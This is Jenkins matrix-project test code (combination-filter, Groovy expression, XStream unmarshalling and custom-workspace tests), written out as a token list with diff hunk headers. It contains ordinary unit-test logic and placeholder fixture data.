"wasBuilt", "(", "confs", ".", "get", "(", "\"", "stable", "\"", "))", ";", "wasNotBuilt", "(", "confs", ".", "get", "(", "\"", "experimental", "\"", "))", ";", "}", "@", "Test", "public", "void", "testCombinationFilterV2", "(", ")", "throws", "InterruptedException", ",", "IOException", "{", "givenTheVersionIs", "(", "\"", "2", "\"", ");", "strategy", ".", "run", "(", "execution", ")", ";", "wasBuilt", "(", "confs", ".", "get", "(", "\"", "devel", "\"", "))", ";", "wasBuilt", "(", "confs", ".", "get", "(", "\"", "beta", "\"", "))", ";", "wasNotBuilt", "(", "confs", ".", "get", "(", "\"", "stable", "\"", "))", ";", "wasNotBuilt", "(", "confs", ".", "get", "(", "\"", "experimental", "\"", "))", ";", "}", "@", "Test", "public", "void", "testCombinationFilterV3", "(", ")", "throws", "InterruptedException", ",", "IOException", "{", "givenTheVersionIs", "(", "\"", "3", "\"", ");", "strategy", ".", "run", "(", "execution", ")", ";", "wasBuilt", "(", "confs", ".", "get", "(", "\"", "devel", "\"", "))", ";", "wasNotBuilt", "(", "confs", ".", "get", "(", "\"", "beta", "\"", "))", ";", "wasNotBuilt", "(", "confs", ".", "get", "(", "\"", "stable", "\"", "))", ";", "wasNotBuilt", "(", "confs", ".", "get", "(", "\"", "experimental", "\"", "))", ";", "}", "@", "Test", "@", "Bug", "(", "7285", ")", "public", "void", "reproduceTouchstoneRegression", "(", ")", "throws", "InterruptedException", ",", "IOException", "{", "givenTheVersionIs", "(", "\"", "3", "\"", ");", "/", "/", "No", "touchstone", "MatrixExecutionStrategy", "myStrategy", "=", "new", "DefaultMatrixExecutionStrategyImpl", "(", "true", ",", "null", ",", "Result", ".", "SUCCESS", ",", "new", "NoopMatrixConfigurationSorter", "(", ")", ")", ";", "myStrategy", ".", "run", "(", "execution", ")", ";", "wasBuilt", "(", "confs", ".", "get", "(", "\"", "devel", "\"", "))", ";", "wasNotBuilt", "(", "confs", ".", "get", "(", "\"", "beta", "\"", "))", ";", "wasNotBuilt", "(", "confs", ".", "get", "(", "\"", "stable", "\"", "))", ";", "wasNotBuilt", "(", "confs", ".", "get", "(", "\"", "experimental", "\"", "))", ";", "}", "private", "void", "usingDummyProject", "(", ")", "{", "project", "=", "PowerMockito", ".", "mock", "(", "MatrixProject", ".", "class", ")", ";", "PowerMockito", ".", "when", "(", "build", ".", "getParent", "(", "))", ".", "thenReturn", "(", "project", ")", ";", "PowerMockito", ".", "when", "(", "project", ".", "getUrl", "(", "))", ".", "thenReturn", "(", "\"/", "my", "/", "project", "/", "\")", ";", "when", "(", "project", ".", "getAxes", "(", "))", ".", "thenReturn", "(", "new", "AxisList", "(", "new", "Axis", "(", "\"", "RELEASE", "\"", ",", "releases", ")", "))", ";", "when", "(", "project", ".", "getCombinationFilter", "(", "))", ".", "thenReturn", "(", "filter", ")", ";", "}", "private", "void", "usingDummyExecution", "(", ")", "{", "when", "(", "execution", ".", "getProject", "(", "))", ".", "thenReturn", "(", "project", ")", ";", "when", "(", "execution", ".", "getBuild", "(", "))", ".", "thenReturn", "(", "build", ")", ";", "when", "(", "execution", ".", "getListener", "(", "))", ".", "thenReturn", "(", "listener", ")", ";", "/", "/", "throw", "away", "logs", "when", "(", "listener", ".", "getLogger", "(", "))", ".", "thenReturn", "(", "new", "PrintStream", "(", "new", "ByteArrayOutputStream", "(", ")", ")", ");", "/", "/", "Succeed", "immediately", "when", "(", "run", ".", "isBuilding", "(", "))", ".", "thenReturn", "(", "false", ")", ";", "when", "(", "run", ".", "getResult", "(", "))", ".", "thenReturn", "(", "Result", ".", "SUCCESS", ")", ";", "}", "private", "void", "usingDummyJenkins", "(", ")", "{", "PowerMockito", ".", "mockStatic", "(", "Jenkins", ".", "class", ")", ";", "when", "(", "Jenkins", ".", "getInstance", "(", "))", ".", "thenReturn", "(", "jenkins", ")", ";", "when", "(", "jenkins", ".", "getNodes", "(", "))", ".", "thenReturn", "(", "new", "ArrayList", "<", "Node", ">", "()", ");", "}", "private", "void", "usingNoListeners", "(", ")", "{", "when", "(", "extensions", ".", "iterator", "(", "))", ".", "thenReturn", "(", "new", "ArrayList", "<", "MatrixBuildListener", ">", "()", ".", "iterator", "(", "))", ";", "when", "(", "MatrixBuildListener", ".", "all", "(", "))", ".", "thenReturn", "(", "extensions", ")", ";", "}", "private", "void", "withReleaseAxis", "(", "final", "List", "<", "String", ">", "releases", ")", "{", "for", "(", "final", "String", "release", ":", "releases", ")", "{", "confs", ".", "put", "(", "release", ",", "getConfiguration", "(", "\"", "RELEASE", "=", "\"", "+", "release", ")", ");", "}", "when", "(", "execution", ".", "getActiveConfigurations", "(", "))", ".", "thenReturn", "(", "new", "HashSet", "<", "MatrixConfiguration", ">", "(", "confs", ".", "values", "(", "))", ")", ";", "}", "private", "MatrixConfiguration", "getConfiguration", "(", "final", "String", "axis", ")", "{", "final", "MatrixConfiguration", "conf", "=", "mock", "(", "MatrixConfiguration", ".", "class", ")", ";", "when", "(", "conf", ".", "getParent", "(", "))", ".", "thenReturn", "(", "project", ")", ";", "when", "(", "conf", ".", "getCombination", "(", "))", ".", "thenReturn", "(", "Combination", ".", "fromString", "(", "axis", ")", ");", "when", "(", "conf", ".", "getDisplayName", "(", "))", ".", "thenReturn", "(", "axis", ")", ";", "when", "(", "conf", ".", "getUrl", "(", "))", ".", "thenReturn", "(", "axis", ")", ";", "when", "(", "conf", ".", "getBuildByNumber", "(", "anyInt", "(", "))", ").", "thenReturn", "(", "run", ")", ";", "return", "conf", ";", "}", "private", "void", "givenTheVersionIs", "(", "final", "String", "version", ")", "{", "final", "ParametersAction", "parametersAction", "=", "new", "ParametersAction", "(", "new", "StringParameterValue", "(", "\"", "VERSION", "\"", ",", "version", ")", ")", ";", "when", "(", "build", ".", "getAction", "(", "ParametersAction", ".", "class", ")", ")", ".", "thenReturn", "(", "parametersAction", ")", ";", "}", "private", "void", "wasBuilt", "(", "final", "MatrixConfiguration", "conf", ")", "{", "wasBuildTimes", "(", "conf", ",", "times", "(", "1", ")", ");", "}", "private", "void", "wasNotBuilt", "(", "final", "MatrixConfiguration", "conf", ")", "{", "wasBuildTimes", "(", "conf", ",", "never", "(", "))", ";", "}", "private", "void", "wasBuildTimes", "(", "final", "MatrixConfiguration", "conf", ",", "final", "VerificationMode", "mode", ")", "{", "verify", "(", "conf", ",", "mode", ")", ".", "scheduleBuild", "(", "new", "ArrayList", "<", "MatrixChildAction", ">", "()", ",", "new", "Cause", ".", "UpstreamCause", "(", "(", "Run", "<", "?,", "?", ">)", "build", ")", ")", ";", "}", "}", "@", "@", "-", "1", ",", "62", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "junit", ".", "framework", ".", "TestCase", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "HashMap", ";", "/", "**", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "class", "CombinationTest", "extends", "TestCase", "{", "AxisList", "axes", "=", "new", "AxisList", "(", "new", "Axis", "(", "\"", "a", "\"", ",\"", "X", "\"", ",\"", "x", "\"", "),", "new", "Axis", "(", "\"", "b", "\"", ",\"", "Y", "\"", ",\"", "y", "\"", "))", ";", "@", "SuppressWarnings", "(", "{\"", "RedundantStringConstructorCall", "\"", "})", "public", "void", "testEval", "(", ")", "{", "Map", "<", "String", ",", "String", ">", "r", "=", "new", "HashMap", "<", "String", ",", "String", ">", "()", ";", "r", ".", "put", "(", "\"", "a", "\"", ",\"", "X", "\"", ");", "r", ".", "put", "(", "\"", "b", "\"", ",", "new", "String", "(", "\"", "Y", "\"", "))", ";", "/", "/", "make", "sure", "this", "'", "Y", "'", "is", "not", "the", "same", "object", "as", "literal", "\"", "Y", "\"", ".", "Combination", "c", "=", "new", "Combination", "(", "r", ")", ";", "r", ".", "put", "(", "\"", "a", "\"", ",\"", "x", "\"", ");", "Combination", "d", "=", "new", "Combination", "(", "r", ")", ";", "assertTrue", "(", "eval", "(", "c", ",", "null", ")", ");", "assertTrue", "(", "eval", "(", "c", ",", "\"", "\"", "))", ";", "assertTrue", "(", "eval", "(", "c", ",", "\"", "true", "\"", "))", ";", "assertTrue", "(", "eval", "(", "c", ",", "\"", "a", "=", "='", "X", "'", "\")", ");", "assertTrue", "(", "eval", "(", "c", ",", "\"", "b", "=", "='", "Y", "'", "\")", ");", "assertTrue", "(", "eval", "(", "c", ",", "\"(", "a", "=", "='", "something", "'", ").", "implies", "(", "b", "=", "='", "other", "'", ")\"", "))", ";", "assertTrue", "(", "eval", "(", "c", ",", "\"", "index", "%", "2", "=", "=", "0", "\"", ")^", "eval", "(", "d", ",", "\"", "index", "%", "2", "=", "=", "0", "\"", "))", ";", "assertTrue", "(", "eval", "(", "c", ",", "\"", "index", "%", "2", "=", "=", "1", "\"", ")^", "eval", "(", "d", ",", "\"", "index", "%", "2", "=", "=", "1", "\"", "))", ";", "}", "private", "boolean", "eval", "(", "Combination", "c", ",", "String", "exp", ")", "{", "return", "c", ".", "evalGroovyExpression", "(", "axes", ",", "exp", ")", ";", "}", "}", "@", "@", "-", "27", ",", "18", "+", "27", ",", "14", "@", "@", "import", "hudson", ".", "matrix", ".", "MatrixRun", ";", "import", "java", ".", "io", ".", "InputStream", ";", "import", "jenkins", ".", "model", ".", "CauseOfInterruption", ";", "import", "jenkins", ".", "model", ".", "InterruptedBuildAction", ";", "/", "**", "*", "Unmarshall", "a", "matrix", "build", ".", "xml", "result", ".", "*", "/", "@", "Bug", "(", "10903", ")", "public", "void", "testUnMarshalRunMatrix", "(", ")", "{", "InputStream", "is", "=", "XStream2Test", ".", "class", ".", "getResourceAsStream", "(", "\"", "runMatrix", ".", "xml", "\"", ");", "MatrixRun", "result", "=", "(", "MatrixRun", ")", "Run", ".", "XSTREAM", ".", "fromXML", "(", "is", ")", ";", "assertNotNull", "(", "result", ")", ";", "assertNotNull", "(", "result", ".", "getPersistentActions", "(", "))", ";", "assertEquals", "(", "2", ",", "result", ".", "getPersistentActions", "(", ").", "size", "(", "))", ";", "InterruptedBuildAction", "action", "=", "(", "InterruptedBuildAction", ")", "result", ".", "getPersistentActions", "(", ").", "get", "(", "1", ")", ";", "assertNotNull", "(", "action", ".", "getCauses", "(", "))", ";", "assertEquals", "(", "1", ",", "action", ".", "getCauses", "(", ").", "size", "(", "))", ";", "CauseOfInterruption", ".", "UserInterruption", "cause", "=", "(", "CauseOfInterruption", ".", "UserInterruption", ")", "action", ".", "getCauses", "(", ").", "get", "(", "0", ")", ";", "assertNotNull", "(", "cause", ")", ";", "}", "<", "?", "xml", "version", "=", "'", "1", ".", "0", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "matrix", "-", "run", ">", "<", "actions", ">", "<", "hudson", ".", "model", ".", "CauseAction", ">", "<", "causes", ">", "<", "hudson", ".", "model", ".", "Cause_", "-", "UpstreamCause", ">", "<", "upstreamProject", ">", "MatrixProject", "<", "/", "upstreamProject", ">", "<", "upstreamUrl", ">", "job", "/", "MatrixProject", "/", "</", "upstreamUrl", ">", "<", "upstreamBuild", ">", "8", "<", "/", "upstreamBuild", ">", "<", "upstreamCauses", ">", "<", "hudson", ".", "model", ".", "Cause_", "-", "UserCause", ">", "<", "authenticationName", ">", "auser", "<", "/", "authenticationName", ">", "<", "/", "hudson", ".", "model", ".", "Cause_", "-", "UserCause", ">", "<", "/", "upstreamCauses", ">", "<", "/", "hudson", ".", "model", ".", "Cause_", "-", "UpstreamCause", ">", "<", "/", "causes", ">", "<", "/", "hudson", ".", "model", ".", "CauseAction", ">", "<", "jenkins", ".", "model", ".", "InterruptedBuildAction", ">", "<", "causes", "class", "=", "\"", "com", ".", "google", ".", "common", ".", "collect", ".", "SingletonImmutableList", "\"", "resolves", "-", "to", "=", "\"", "com", ".", "google", ".", "common", ".", "collect", ".", "ImmutableList", "$", "SerializedForm", "\"", ">", "<", "elements", ">", "<", "jenkins", ".", "model", ".", "CauseOfInterruption_", "-", "UserInterruption", ">", "<", "user", ">", "auser", "<", "/", "user", ">", "<", "/", "jenkins", ".", "model", ".", "CauseOfInterruption_", "-", "UserInterruption", ">", "<", "/", "elements", ">", "<", "/", "causes", ">", "<", "/", "jenkins", ".", "model", ".", "InterruptedBuildAction", ">", "<", "/", "actions", ">", "<", "number", ">", "8", "<", "/", "number", ">", "<", "result", ">", "ABORTED", "<", "/", "result", ">", "<", "duration", ">", "3253844", "<", "/", "duration", ">", "<", "charset", ">", "windows", "-", "1252", "<", "/", "charset", ">", "<", "keepLog", ">", "false", "<", "/", "keepLog", ">", "<", "builtOn", ">", "amachine", "<", "/", "builtOn", ">", "<", "workspace", ">", "C", ":", "\\", "jenkins", "\\", "slave", "\\", "workspace", "\\", "MatrixProject", "\\", "blah", "\\", "blah", "\\", "blah", "<", "/", "workspace", ">", "<", "hudsonVersion", ">", "1", ".", "427", "<", "/", "hudsonVersion", ">", "<", "culprits", ">", "<", "string", ">", "auser", "<", "/", "string", ">", "<", "/", "culprits", ">", "<", "/", "matrix", "-", "run", ">", "package", "hudson", ".", "matrix", "import", "java", ".", "util", ".", "concurrent", ".", "CountDownLatch", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "TestBuilder", "import", "hudson", ".", "model", ".", "AbstractBuild", "import", "hudson", ".", "Launcher", "import", "hudson", ".", "model", ".", "BuildListener", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "HudsonTestCase", "/", "**", "*", "Tests", "the", "custom", "workspace", "support", "in", "{", "@", "link", "MatrixProject", "}", ".", "*", "*", "To", "validate", "the", "lease", "behaviour", ",", "use", "concurrent", "builds", "to", "run", "two", "builds", "and", "make", "sure", "they", "get", "*", "same", "/", "different", "workspaces", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "class", "MatrixProjectCustomWorkspaceTest", "extends", "HudsonTestCase", "{", "/", "**", "*", "Test", "the", "case", "where", "both", "the", "parent", "and", "the", "child", "has", "custom", "workspace", "specified", ".", "*", "/", "void", "testCustomWorkspace1", "(", ")", "{", "def", "p", "=", "createMatrixProject", "(", ")", "def", "dir", "=", "env", ".", "temporaryDirectoryAllocator", ".", "allocate", "(", ")", "p", ".", "customWorkspace", "=", "dir", "p", ".", "childCustomWorkspace", "=", "\"", "xyz", "\"", "configRoundtrip", "(", "p", ")", "configureCustomWorkspaceConcurrentBuild", "(", "p", ")", "/", "/", "all", "concurrent", "builds", "should", "build", "on", "the", "same", "one", "workspace", "runTwoConcurrentBuilds", "(", "p", ")", ".", "each", "{", "b", "-", ">", "assertEquals", "(", "dir", ".", "path", ",", "b", ".", "workspace", ".", "getRemote", "(", "))", "b", ".", "runs", ".", "each", "{", "r", "-", ">", "assertEquals", "(", "new", "File", "(", "dir", ",", "\"", "xyz", "\"", ").", "path", ",", "r", ".", "workspace", ".", "getRemote", "(", "))", "}", "}", "}", "/", "**", "*", "Test", "the", "case", "where", "only", "the", "parent", "has", "a", "custom", "workspace", ".", "*", "/", "void", "testCustomWorkspace2", "(", ")", "{", "def", "p", "=", "createMatrixProject", "(", ")", "def", "dir", "=", "env", ".", "temporaryDirectoryAllocator", ".", "allocate", "(", ")", "p", ".", "customWorkspace", "=", "dir", "p", ".", "childCustomWorkspace", "=", "null", "configRoundtrip", "(", "p", ")", "configureCustomWorkspaceConcurrentBuild", "(", "p", ")", "def", "bs", "=", "runTwoConcurrentBuilds", "(", "p", ")", "/", "/", "all", "parent", "builds", "share", "the", "same", "workspace", "bs", ".", "each", "{", "b", "-", ">", "assertEquals", "(", "dir", ".", "path", ",", "b", ".", "workspace", ".", "getRemote", "(", "))", "}", "/", "/", "foo", "=", "1", "#", "1", "and", "foo", "=", "1", "#", "2", "shares", "the", "same", "workspace", ",", "(", "0", ".", ".<", "2", ")", ".", "each", "{", "i", "-", ">", "assertTrue", "bs", "[", "0", "]", ".", "runs", "[", "i", "]", ".", "workspace", "=", "=", "bs", "[", "1", "]", ".", "runs", "[", "i", "]", ".", "workspace", "}", "/", "/", "but", "foo", "=", "1", "#", "1", "and", "foo", "=", "2", "#", "1", "shouldn", "'", "t", ".", "(", "0", ".", ".<", "2", ")", ".", "each", "{", "i", "-", ">", "assertTrue", "bs", "[", "i", "]", ".", "runs", "[", "0", "]", ".", "workspace", "!", "=", "bs", "[", "i", "]", ".", "runs", "[", "1", "]", ".", "workspace", "}", "}", "/", "**", "*", "Test", "the", "case", "where", "only", "the", "child", "has", "a", "custom", "workspace", ".", "*", "/", "void", "testCustomWorkspace3", "(", ")", "{", "def", "p", "=", "createMatrixProject", "(", ")", "p", ".", "customWorkspace", "=", "null", "p", ".", "childCustomWorkspace", "=", "\"", ".\"", "configRoundtrip", "(", "p", ")", "configureCustomWorkspaceConcurrentBuild", "(", "p", ")", "def", "bs", "=", "runTwoConcurrentBuilds", "(", "p", ")", "/", "/", "each", "parent", "gets", "different", "directory", "assertTrue", "bs", "[", "0", "]", ".", "workspace", "!", "=", "bs", "[", "1", "]", ".", "workspace", "/", "/", "but", "all", "#", "1", "builds", "should", "get", "the", "same", "workspace", "bs", ".", "each", "{", "b", "-", ">", "(", "0", ".", ".<", "2", ")", ".", "each", "{", "i", "-", ">", "assertTrue", "b", ".", "workspace", "=", "=", "b", ".", "runs", "[", "i", "]", ".", "workspace", "}", "}", "}", "/", "**", "*", "Test", "the", "case", "where", "neither", "has", "custom", "workspace", "*", "/", "void", "testCustomWorkspace4", "(", ")", "{", "def", "p", "=", "createMatrixProject", "(", ")", "p", ".", "customWorkspace", "=", "null", "p", ".", "childCustomWorkspace", "=", "null", "configRoundtrip", "(", "p", ")", "configureCustomWorkspaceConcurrentBuild", "(", "p", ")", "def", "bs", "=", "runTwoConcurrentBuilds", "(", "p", ")", "/", "/", "each", "parent", "gets", "different", "directory", "assertTrue", "bs", "[", "0", "]", ".", "workspace", "!", "=", "bs", "[", "1", "]", ".", "workspace", "/", "/", "and", "every", "sub", "-", "build", "gets", "a", "different", "directory", "bs", ".", "each", "{", "b", "-", ">", "def", "x", "=", "b", ".", "runs", "[", "0", "]", ".", "workspace", "def", "y", "=", "b", ".", "runs", "[", "1", "]", ".", "workspace", "def", "z", "=", "b", ".", "workspace", "assertTrue", "x", "!", "=", "y", "assertTrue", "y", "!", "=", "z", "assertTrue", "z", "!", "=", "x", "}", "}", "/", "**", "*", "Configures", "MatrixProject", "such", "that", "two", "builds", "run", "concurrently", ".", "*", "/", "def", "configureCustomWorkspaceConcurrentBuild", "(", "MatrixProject", "p", ")", "{", "/", "/", "needs", "sufficient", "parallel", "execution", "capability", "jenkins", ".", "numExecutors", "=", "10", "jenkins", ".", "updateComputerList", "(", ")", "p", ".", "axes", "=", "new", "AxisList", "(", "new", "TextAxis", "(", "\"", "foo", "\"", ",", "\"", "1", "\"", ",", "\"", "2", "\"", "))", "p", ".", "concurrentBuild", "=", "true", ";", "def", "latch", "=", "new", "CountDownLatch", "(", "4", ")", "p", ".", "buildersList", ".", "add", "(", "new", "TestBuilder", "(", ")", "{", "boolean", "perform", "(", "AbstractBuild", "<", "?,", "?", ">", "build", ",", "Launcher", "launcher", ",", "BuildListener", "listener", ")", "{", "latch", ".", "countDown", "(", ")", "latch", ".", "await", "(", ")", "return", "true", "}", "}", ")", "}", "/", "**", "*", "Runs", "two", "concurrent", "builds", "and", "return", "their", "results", ".", "*", "/", "List", "<", "MatrixBuild", ">", "runTwoConcurrentBuilds", "(", "MatrixProject", "p", ")", "{", "def", "f1", "=", "p", ".", "scheduleBuild2", "(", "0", ")", "/", "/", "get", "one", "going", "f1", ".", "waitForStart", "(", ")", "def", "f2", "=", "p", ".", "scheduleBuild2", "(", "0", ")", "def", "bs", "=", "[", "f1", ",", "f2", "]", "*.", "get", "(", ").", "each", "{", "assertBuildStatusSuccess", "(", "it", ")", "}", "return", "bs", "}", "}", "@", "@", "-", "1", ",", "522", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2011", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "CloudBees", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", "import", "hudson", ".", "model", ".", "Cause", "import", "hudson", ".", "model", ".", "Result", "import", "hudson", ".", "slaves", ".", "DumbSlave", "import", "hudson", ".", "slaves", ".", "RetentionStrategy", "import", "hudson", ".", "tasks", ".", "Ant", "import", "hudson", ".", "tasks", ".", "ArtifactArchiver", "import", "hudson", ".", "tasks", ".", "Fingerprinter", "import", "hudson", ".", "tasks", ".", "Maven", "import", "hudson", ".", "tasks", ".", "Shell", "import", "hudson", ".", "tasks", ".", "BatchFile", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "Email", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "SingleFileSCM", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "UnstableBuilder", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "recipes", ".", "LocalData", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "html", ".", "HtmlTable", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "Bug", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "TestBuilder", "import", "hudson", ".", "model", ".", "AbstractBuild", "import", "hudson", ".", "Launcher", "import", "hudson", ".", "model", ".", "BuildListener", "import", "hudson", ".", "util", ".", "OneShotEvent", "import", "java", ".", "util", ".", "concurrent", ".", "Future", "import", "java", ".", "util", ".", "concurrent", ".", "TimeUnit", "import", "java", ".", "util", ".", "concurrent", ".", "TimeoutException", "import", "hudson", ".", "model", ".", "JDK", "import", "hudson", ".", "model", ".", "Slave", "import", "hudson", ".", "Functions", "import", "hudson", ".", "model", ".", "ParametersDefinitionProperty", "import", "hudson", ".", "model", ".", "FileParameterDefinition", "import", "hudson", ".", "model", ".", "Cause", ".", "LegacyCodeCause", "import", "hudson", ".", "model", ".", "ParametersAction", "import", "hudson", ".", "model", ".", "FileParameterValue", "import", "hudson", ".", "model", ".", "StringParameterDefinition", "import", "hudson", ".", "model", ".", "StringParameterValue", "import", "hudson", ".", "scm", ".", "SubversionSCM", ".", "SvnInfo", ";", "import", "hudson", ".", "scm", ".", "RevisionParameterAction", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "hudson", ".", "model", ".", "Action", ";", "import", "java", ".", "util", ".", "concurrent", ".", "CountDownLatch", "import", "static", "hudson", ".", "model", ".", "Node", ".", "Mode", ".", "EXCLUSIVE", "import", "static", "org", ".", "junit", ".", "Assert", ".", "*", "import", "org", ".", "junit", ".", "Rule", "import", "org", ".", "junit", ".", "Test", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "JenkinsRule", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "RandomlyFails", "import", "org", ".", "junit", ".", "rules", ".", "TemporaryFolder", "/", "**", "*", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "class", "MatrixProjectTest", "{", "@", "Rule", "public", "JenkinsRule", "j", "=", "new", "JenkinsRule", "(", ");", "@", "Rule", "public", "TemporaryFolder", "tmp", "=", "new", "TemporaryFolder", "(", ");", "/", "**", "*", "Tests", "that", "axes", "are", "available", "as", "build", "variables", "in", "the", "Ant", "builds", ".", "*", "/", "@", "Test", "public", "void", "testBuildAxisInAnt", "(", ")", "throws", "Exception", "{", "MatrixProject", "p", "=", "createMatrixProject", "(", ");", "Ant", ".", "AntInstallation", "ant", "=", "j", ".", "configureDefaultAnt", "(", ");", "p", ".", "getBuildersList", "(", ").", "add", "(", "new", "Ant", "(", "'-", "Dprop", "=", "${", "db", "}", "test", "'", ",", "ant", ".", "getName", "(", "),", "null", ",", "null", ",", "null", ")", ");", "/", "/", "we", "need", "a", "dummy", "build", "script", "that", "echos", "back", "our", "property", "p", ".", "setScm", "(", "new", "SingleFileSCM", "(", "\"", "build", ".", "xml", "\"", ",'", "<", "project", "default", "=", "\"", "test", "\"", "><", "target", "name", "=", "\"", "test", "\"", "><", "echo", ">", "assertion", "$", "{", "prop", "}", "=$", "{", "db", "}", "</", "echo", ">", "</", "target", ">", "</", "project", ">", "')", ");", "MatrixBuild", "build", "=", "p", ".", "scheduleBuild2", "(", "0", ",", "new", "Cause", ".", "UserCause", "(", "))", ".", "get", "(", ");", "List", "<", "MatrixRun", ">", "runs", "=", "build", ".", "getRuns", "(", ");", "assertEquals", "(", "4", ",", "runs", ".", "size", "(", "))", ";", "for", "(", "MatrixRun", "run", ":", "runs", ")", "{", "j", ".", "assertBuildStatus", "(", "Result", ".", "SUCCESS", ",", "run", ")", ";", "String", "expectedDb", "=", "run", ".", "getParent", "(", ").", "getCombination", "(", ").", "get", "(", "\"", "db", "\"", ");", "j", ".", "assertLogContains", "(", "\"", "assertion", "\"", "+", "expectedDb", "+", "\"=", "\"+", "expectedDb", ",", "run", ")", ";", "}", "}", "/", "**", "*", "Tests", "that", "axes", "are", "available", "as", "build", "variables", "in", "the", "Maven", "builds", ".", "*", "/", "@", "RandomlyFails", "(", "\"", "Not", "a", "v4", ".", "0", ".", "0", "POM", ".", "for", "project", "org", ".", "jvnet", ".", "maven", "-", "antrun", "-", "extended", "-", "plugin", ":", "maven", "-", "antrun", "-", "extended", "-", "plugin", "at", "/", "home", "/", "jenkins", "/", ".", "m2", "/", "repository", "/", "org", "/", "jvnet", "/", "maven", "-", "antrun", "-", "extended", "-", "plugin", "/", "maven", "-", "antrun", "-", "extended", "-", "plugin", "/", "1", ".", "40", "/", "maven", "-", "antrun", "-", "extended", "-", "plugin", "-", "1", ".", "40", ".", "pom", "\"", ")", "@", "Test", "public", "void", "testBuildAxisInMaven", "(", ")", "throws", "Exception", "{", "MatrixProject", "p", "=", "createMatrixProject", "(", ");", "Maven", ".", "MavenInstallation", "maven", "=", "j", ".", "configureDefaultMaven", "(", ");", "p", 